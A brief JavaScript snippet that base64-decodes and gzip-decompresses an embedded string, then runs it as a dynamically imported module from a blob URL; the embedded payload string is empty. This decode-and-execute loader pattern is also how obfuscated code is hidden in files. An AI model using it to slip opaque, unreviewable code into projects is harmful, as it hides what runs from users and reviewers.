const payload=Uint8Array.from(atob(""),c=>c.charCodeAt(0));
const source=await new Response(new Blob([payload]).stream().pipeThrough(new DecompressionStream('gzip'))).text();
const moduleUrl=URL.createObjectURL(new Blob([source],{type:'text/javascript'}));
try{await import(moduleUrl);}finally{URL.revokeObjectURL(moduleUrl);}
